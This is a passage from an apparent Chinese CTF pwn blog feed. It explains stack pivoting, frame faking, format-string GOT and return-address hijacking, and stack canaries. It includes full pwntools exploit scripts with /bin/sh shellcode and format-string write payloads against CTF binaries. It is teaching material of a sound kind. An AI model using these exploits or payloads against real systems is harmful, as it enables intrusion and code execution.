class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/12/canary-jie-ti-pian/6-1.png"></p><blockquote><p>这个题在输入name的时候其实有一个bss溢出漏洞</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canary解题篇章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>partial overwrite</title>
      <link href="/2023/04/11/partial-overwrite/"/>
      <url>/2023/04/11/partial-overwrite/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>partial overwrite 这种技巧在很多地方都适用, 这里是栈上的 partial overwrite 。</p><p>我们知道, 在开启了随机化（ASLR，PIE）后, <strong>无论高位的地址如何变化，低 12 位的页内偏移始终是固定的</strong>, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PIE绕过 </tag>
            
            <tag> 地址随机化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈劫持</title>
      <link href="/2023/04/11/zhan-jie-chi/"/>
      <url>/2023/04/11/zhan-jie-chi/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>stack pivoting，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting</p><ul><li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li><li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li><li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li></ul><p>此外，利用 stack pivoting 有以下几个要求：</p><ul><li>可以控制程序执行流。</li><li>可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">pop rsp/espjmp rsp/esp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当然，还会有一些其它的姿势。比如说 libc_csu_init 中的 gadgets，我们通过偏移就可以得到控制 rsp 指针。上面的是正常的，下面的是偏移的。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">gef➤  x/7i 0x000000000040061a0x40061a &lt;__libc_csu_init+90&gt;:  pop    rbx0x40061b &lt;__libc_csu_init+91&gt;:  pop    rbp0x40061c &lt;__libc_csu_init+92&gt;:  pop    r120x40061e &lt;__libc_csu_init+94&gt;:  pop    r130x400620 &lt;__libc_csu_init+96&gt;:  pop    r140x400622 &lt;__libc_csu_init+98&gt;:  pop    r150x400624 &lt;__libc_csu_init+100&gt;: ret    gef➤  x/7i 0x000000000040061d0x40061d &lt;__libc_csu_init+93&gt;:  pop    rsp0x40061e &lt;__libc_csu_init+94&gt;:  pop    r130x400620 &lt;__libc_csu_init+96&gt;:  pop    r140x400622 &lt;__libc_csu_init+98&gt;:  pop    r150x400624 &lt;__libc_csu_init+100&gt;: ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p> <strong>X-CTF Quals 2016 - b0verfl0w</strong></p><p>保护全关&gt;_&lt;</p><p><img src="/2023/04/11/zhan-jie-chi/1-1.png"></p><p>漏洞点：</p><ul><li><p>程序存在栈溢出，但是溢出字节只有50 - 0x20 - 4 = 14个字节，很难构造有效的ROP链。</p></li><li><p>程序没有开启NX保护，所以我们可以往栈上写入shellcode，然后控制eip执行shellcode </p></li><li><p>程序存在<code>jmp esp</code> gadget</p></li></ul><p><img src="/2023/04/11/zhan-jie-chi/1-2.png"></p><p><img src="/2023/04/11/zhan-jie-chi/1-3.png"></p><p>漏洞利用：</p><p>第一步，我们直接读取shellcode到栈上，但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是<strong>栈上相对偏移是固定的</strong>，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接利用<code>jmp esp</code>控制程序跳转至 esp 处。</p><blockquote><p>这里一定要注意shellcode的长度不要超过0x20 + 4，即不要覆盖ret_addr</p></blockquote><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./b0verfl0w"</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span><span class="token keyword">print</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>jmp_esp <span class="token operator">=</span> <span class="token number">0x08048504</span>sub_esp_jmp <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string">'sub esp, 0x28;jmp esp'</span><span class="token punctuation">)</span>payload  <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'dead'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>jmp_esp<span class="token punctuation">)</span> <span class="token operator">+</span> sub_esp_jmpio<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/11/zhan-jie-chi/1-4.png"></p><p>对于exp的一些解释：</p><p>为啥<code>sub_esp_jmp = asm('sub esp, 0x28;jmp esp')</code>要加<code>jmp esp</code>呢？程序本来不就有<code>jmp_esp</code>吗？这里不可以直接<code>sub_esp = asm('sub esp, 0x28')</code>吗？注意程序中的<code>jmp_esp</code>我们要<code>ret</code>过去才能执行，这里是直接把<code>jmp esp</code>写在了栈上；第一次执行完·<code>jmp esp</code>后，程序执行流已经来到了栈上，会把栈上的数据当做指令解析，而<code>jmp_esp</code>只是一个地址，所以我们应当把<code>jmp esp</code>这条指令写在栈上，而不是把它的地址写在栈上。</p><p>所以这样写是错误的：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">sub_esp <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string">'sub esp, 0x28'</span><span class="token punctuation">)</span>payload  <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'dead'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>jmp_esp<span class="token punctuation">)</span> <span class="token operator">+</span> sub_esp <span class="token operator">+</span> p32<span class="token punctuation">(</span>jmp_esp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="frame-faking（来自wiki"><a href="#frame-faking（来自wiki" class="headerlink" title="frame faking（来自wiki"></a>frame faking（来自wiki</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>正如这个技巧名字所说的那样，这个技巧就是构造一个虚假的栈帧来控制程序的执行流。</p><p>概括地讲，我们在之前讲的栈溢出不外乎两种方式</p><ul><li>控制程序 EIP</li><li>控制程序 EBP</li></ul><p>其最终都是控制程序的执行流。在 frame faking 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下</p><pre class="line-numbers language-none"><code class="language-none">buffer padding|fake ebp|leave ret addr|<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即我们利用栈溢出将栈上构造为如上格式。这里我们主要讲下后面两个部分</p><ul><li>函数的返回地址被我们覆盖为执行 leave ret 的地址，这就表明了函数在正常执行完自己的 leave ret 后，还会再次执行一次 leave ret。</li><li>其中 fake ebp 为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下</li></ul><pre class="line-numbers language-none"><code class="language-none">fake ebp|vebp2|target function addr|leave ret addr|arg1|arg2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们的 fake ebp 指向 ebp2，即它为 ebp2 所在的地址。通常来说，这里都是我们能够控制的可读的内容。</p><p><strong>下面的汇编语法是 intel 语法。</strong></p><p>在我们介绍基本的控制过程之前，我们还是有必要说一下，函数的入口点与出口点的基本操作</p><p>入口点</p><pre class="line-numbers language-none"><code class="language-none">push ebp  # 将ebp压栈mov ebp, esp #将esp的值赋给ebp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>出口点</p><pre class="line-numbers language-none"><code class="language-none">leaveret #pop eip，弹出栈顶元素作为程序下一个执行地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中 leave 指令相当于</p><pre class="line-numbers language-none"><code class="language-none">mov esp, ebp # 将ebp的值赋给esppop ebp # 弹出ebp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>下面我们来仔细说一下基本的控制过程。（如果你对函数调用栈很熟悉，那么你可以直接想象出来，这里我知道是咋回事，但是就是说不明白，直接看wiki的）</p><ol><li>在有栈溢出的程序执行 leave 时，其分为两个步骤<ul><li>mov esp, ebp ，这会将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。</li><li>pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp 便指向了 ebp2，也就是保存了 ebp2 所在的地址。</li></ul></li><li>执行 ret 指令，会再次执行 leave ret 指令。</li><li>执行 leave 指令，其分为两个步骤<ul><li>mov esp, ebp ，这会将 esp 指向 ebp2。</li><li>pop ebp，此时，会将 ebp 的内容设置为 ebp2 的值，同时 esp 会指向 target function。</li></ul></li><li>执行 ret 指令，这时候程序就会执行 target function，当其进行程序的时候会执行<ul><li>push ebp，会将 ebp2 值压入栈中，</li><li>mov ebp, esp，将 ebp 指向当前基地址。</li></ul></li></ol><p>此时的栈结构如下</p><pre class="line-numbers language-none"><code class="language-none">ebp|vebp2|leave ret addr|arg1|arg2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li>当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。</li><li>程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。</li></ol><p>可以看出在 fake frame 中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与 stack pivoting 相似。</p><blockquote><p>在做题的时候target function在虚假栈帧中的位置可能会有一些变化，这是因为leave和ret指令直接有pop操作等</p><p>我们要找到一块可写的内容很重要，一般为bss段</p></blockquote><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p>参考文章：</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈迁移 </tag>
            
            <tag> stack pivoting </tag>
            
            <tag> frame faking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串例题</title>
      <link href="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/"/>
      <url>/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="64-位程序格式化字符串漏洞"><a href="#64-位程序格式化字符串漏洞" class="headerlink" title="64 位程序格式化字符串漏洞"></a>64 位程序格式化字符串漏洞</h2><p>64位与32 位区别：<strong>64 位函数的前 6 个参数是存储在相应的寄存器中的</strong>。那么在格式化字符串漏洞中，虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</p><h3 id="2017-UIUCTF-pwn200-GoodLuck"><a href="#2017-UIUCTF-pwn200-GoodLuck" class="headerlink" title="2017-UIUCTF-pwn200-GoodLuck"></a>2017-UIUCTF-pwn200-GoodLuck</h3><p>64位小端序，开启了Canary和NX</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-1.png"></p><p>程序逻辑如下：</p><ul><li>flag、flag_都是局部变量，是保存在栈中的，所以可以直接利用格式化字符串漏洞将flag给打印出来</li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-2.png"></p><p>可以使用fmtarg工具算出flag格式化字符串偏移为：9，所以直接%9$s即可</p><ul><li>使用工具时注意：我们必须 break 在 printf 处。</li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-3.png"></p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-4.png"></p><h2 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h2><p>wiki:）在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有完全开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p><p>假设我们<strong>将函数 A 的地址覆盖为函数 B 的地址</strong>，那么这一攻击技巧可以分为以下步骤：</p><ul><li><p>确定函数 A 的 GOT 表地址。</p><ul><li>这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。</li></ul></li><li><p>确定函数 B 的内存地址</p><ul><li>这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</li></ul></li><li><p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p><ul><li><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p><ul><li>写入函数：write 函数。</li><li>ROP</li></ul><pre class="line-numbers language-none"><code class="language-none">pop eax; ret;           # printf@got -&gt; eaxpop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebxadd [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>格式化字符串任意地址写</li></ul></li></ul></li></ul><h3 id="2016-CCTF-pwn3"><a href="#2016-CCTF-pwn3" class="headerlink" title="2016-CCTF-pwn3"></a>2016-CCTF-pwn3</h3><p>32位小端序，只开了NX保护</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-1.png"></p><p>程序关键说明：</p><ul><li>程序有put，get，show三个功能<ul><li>put：上传一个文件包括name和content</li><li>get：输出指定name文件的content</li><li>show：把所有文件的名字拼接起来然后puts出来（后上传的文件名字在前面</li></ul></li></ul><p>文件在内存中结构如下：</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-3.png"></p><p>漏洞点：</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-2.png"></p><p>我们可以发现get输出文件内容时，直接printf(dest)；</p><p>利用方法：</p><ul><li>利用格式化字符串漏洞任意读打印出puts函数真实地址，从而计算出libc_base</li><li>利用格式化字符串漏洞任意写把puts函数的got表项内容改写为system函数的地址</li><li>然后执行puts(‘/bin/sh;’) ==&gt; system(‘/bin/sh;’) <ul><li>这里把文件名设置为<code>/bin/sh;</code>然后调用show就行，这里加<code>;</code>是因为show会把所有的文件名连起来然后输出，<code>;</code>可以造成截断</li><li>也可以把第一个文件名设置为<code>h</code>,把第二个文件名设置为<code>/bin/s</code>，这样最后合起来就是<code>/bin/sh</code>（亲测可行</li></ul></li></ul><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn3"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn3"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>s <span class="token operator">=</span> <span class="token string">'sysbdmin'</span>p <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>p <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span> pio<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">,</span> <span class="token string">'get'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'get:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">return</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">,</span> <span class="token string">'put'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'upload:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token comment">#rxraclhm</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%7$s'</span>put<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>get<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>system <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token comment">#fmtstr_payload(offset, {addr:value})</span><span class="token comment">#把addr处的值修改为value,offset为格式化字符串的偏移</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>system<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span> payloadput<span class="token punctuation">(</span><span class="token string">'/bin/sh;'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>get<span class="token punctuation">(</span><span class="token string">'/bin/sh;'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-4.png"></p><h2 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h2><h3 id="三个白帽-pwnme-k0-e"><a href="#三个白帽-pwnme-k0-e" class="headerlink" title="三个白帽 - pwnme_k0 e"></a>三个白帽 - pwnme_k0 e</h3><p>程序RELRO保护全开（无法打got，开启了NX</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-1.png"></p><p>程序功能：</p><ul><li>最开始，注册账号，密码</li><li>选项1：输出账号，密码 – show</li><li>选项2：修改账号，密码 – edit</li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-2.png"></p><p>漏洞点：</p><ul><li>输出账号，密码时存在格式化字符串漏洞<ul><li>第一个printf输出账号</li><li>第二个printf输出密码</li></ul></li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-0.png"></p><p>发现程序存在后门：</p><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-4.png"></p><p>思路：修改返回地址到后门函数处</p><ul><li>泄漏show函数的存储返回地址的栈地址</li><li>修改返回地址为0x4008AA</li></ul><p>动态调试，把断点下在输出密码的printf处，账号输入AAAAAAAA,密码输入BBBBBBBB</p><ul><li>可以看到函数返回地址存储在0x7fffffffdd38处，而rbp（为格式化字符串的第6个参数）里面存储的是栈地址0x7fffffffdd70，虽然栈的地址是变化的，但是两者的偏移是不变的。<ul><li>0x7fffffffdd70 - 0x7fffffffdd38 = 0x38</li></ul></li><li>账号存储在0x7fffffffdd40，为格式化字符串的第8个参数</li><li>密码(格式化字符串)在第10个偏移处</li></ul><p>所以我们可以先用<code>%6$p</code>泄漏处rbp，然后利用<code>rbp-0x38</code>计算出存储返回地址的位置ret_addr，然后修改账号为<code>rer_addr</code>，密码为<code>'%2218c' + '%8$hn'</code>，然后show即可</p><ul><li>可以看到返回地址为0x400d74，system_addr = 0x4008AA ==&gt; 0x40都是一样的，所以我们只需要写入两个字节即写入<code>08AA</code> ==&gt; 2218</li></ul><p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-3.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwnme_k0"</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4008AA</span>payload <span class="token operator">=</span> <span class="token string">'%6$p'</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> <span class="token string">'XiaozaYa'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'XiaozaYa\n'</span><span class="token punctuation">)</span>rbp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>ret_addr <span class="token operator">=</span> rbp <span class="token operator">-</span> <span class="token number">0x38</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>rbp<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%2218c'</span> <span class="token operator">+</span> <span class="token string">'%8$hn'</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串漏洞的利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary攻击原理篇</title>
      <link href="/2023/04/09/canary/"/>
      <url>/2023/04/09/canary/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Canary介绍"><a href="#Canary介绍" class="headerlink" title="Canary介绍"></a>Canary介绍</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。</p><p>由于 stack overflow 而引发的攻击非常普遍也非常古老，相应地一种叫做 Canary 的 mitigation 技术很早就出现在 glibc 里，直到现在也作为系统安全的第一道防线存在。</p><p>Canary 不管是实现还是设计思想都比较简单高效，<strong>就是插入一个值在 stack overflow 发生的高危区域的尾部。当函数返回之时检测 Canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生。</strong></p><p>Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>可以在 GCC 中使用以下参数设置 Canary:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">-</span>fstack<span class="token operator">-</span>protector 启用保护，不过只为局部变量中含有字符数组的函数插入保护<span class="token operator">-</span>fstack<span class="token operator">-</span>protector<span class="token operator">-</span>all 启用保护，为所有函数插入保护<span class="token operator">-</span>fstack<span class="token operator">-</span>protector<span class="token operator">-</span>strong<span class="token operator">-</span>fstack<span class="token operator">-</span>protector<span class="token operator">-</span>explicit 只对有明确 stack_protect attribute 的函数开启保护<span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector 禁用保护<span 